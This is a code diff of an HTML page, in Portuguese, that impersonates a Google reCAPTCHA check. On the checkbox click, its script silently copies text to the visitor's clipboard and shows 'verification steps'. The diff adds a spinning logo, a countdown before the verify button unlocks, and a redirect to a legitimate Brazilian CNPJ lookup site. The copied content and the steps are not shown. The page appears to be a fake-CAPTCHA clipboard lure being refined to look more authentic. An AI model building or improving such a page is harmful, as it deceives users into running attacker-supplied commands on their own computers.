@@ -20,39 +20,46 @@
             border: 1px solid #dadce0;
             border-radius: 8px;
             padding: 30px;
-            width: 420px; /* Aumentado de 350px */
+            width: 420px;
             box-shadow: 0 4px 6px rgba(0,0,0,0.05);
         }
 
-        .checkbox-container {
+        .header-container {
             display: flex;
+            justify-content: space-between;
             align-items: center;
             margin-bottom: 20px;
+        }
+
+        .checkbox-label {
+            display: flex;
+            align-items: center;
+            gap: 12px;
             cursor: pointer;
         }
 
         #captcha-checkbox {
             width: 22px;
             height: 22px;
-            margin-right: 12px;
             cursor: pointer;
         }
 
         .recaptcha-brand {
             display: flex;
-            justify-content: flex-end;
-            margin-top: 20px;
+            flex-direction: column;
+            align-items: flex-end;
         }
 
         .recaptcha-logo {
             display: flex;
             flex-direction: column;
             align-items: center;
+            gap: 2px;
         }
 
         .recaptcha-logo img {
             width: 32px;
-            margin-bottom: 5px;
+            transition: transform 0.8s ease;
         }
 
         .recaptcha-logo span {
@@ -76,14 +83,13 @@
         }
 
         .verification-steps ol {
-            padding-left: 20px; /* Reduzido para ganhar espaço */
+            padding-left: 20px;
             margin: 15px 0;
         }
 
         .verification-steps li {
             margin-bottom: 12px;
             line-height: 1.4;
-            padding-right: 10px; /* Espaço extra para texto */
         }
 
         .verification-code {
@@ -109,24 +115,41 @@
             font-weight: 500;
             margin-top: 15px;
             transition: background 0.2s;
+            disabled: true;
         }
 
-        #verify-button:hover {
+        #verify-button:hover:not(:disabled) {
             background: #1557b0;
+        }
+
+        #verify-button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(720deg); }
+        }
+
+        .spin-animation {
+            animation: spin 0.8s ease-out;
         }
     </style>
 </head>
 <body>
     <div class="captcha-container">
-        <div class="checkbox-container">
-            <input type="checkbox" id="captcha-checkbox">
-            <label for="captcha-checkbox" style="font-size: 16px; color: #202124;">Não sou um robô</label>
-        </div>
-        
-        <div class="recaptcha-brand">
-            <div class="recaptcha-logo">
-                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
-                <span>reCAPTCHA</span>
+        <div class="header-container">
+            <label class="checkbox-label">
+                <input type="checkbox" id="captcha-checkbox">
+                <span style="font-size: 16px; color: #202124;">Não sou um robô</span>
+            </label>
+            
+            <div class="recaptcha-brand">
+                <div class="recaptcha-logo">
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+                    <span>reCAPTCHA</span>
+                </div>
             </div>
         </div>
 
@@ -159,7 +182,26 @@
             document.execCommand('copy');
             document.body.removeChild(textArea);
 
+            const logo = document.querySelector('.recaptcha-logo img');
+            logo.classList.add('spin-animation');
+            setTimeout(() => logo.classList.remove('spin-animation'), 800);
+
             document.getElementById('verification-box').style.display = 'block';
+
+            const button = document.getElementById('verify-button');
+            button.disabled = true;
+            let seconds = 6;
+            
+            const countdown = setInterval(() => {
+                button.textContent = `VERIFICAR (${seconds})`;
+                seconds--;
+                
+                if(seconds < 0) {
+                    clearInterval(countdown);
+                    button.disabled = false;
+                    button.textContent = 'VERIFICAR';
+                }
+            }, 1000);
         });
 
         function verificarCaptcha() {
@@ -171,14 +213,10 @@
                 button.innerHTML = '✔ Verificado';
                 button.style.backgroundColor = '#34a853';
                 setTimeout(() => {
-                    alert('Verificação concluída com sucesso!');
+                    window.location.href = 'https://www.contabilizei.com.br/consulta-cnpj-cartao/'; // REDIRECIONAMENTO
                 }, 500);
             }, 2000);
         }
     </script>
 </body>
-</html>
-
-</body>
-</html>
 </html>
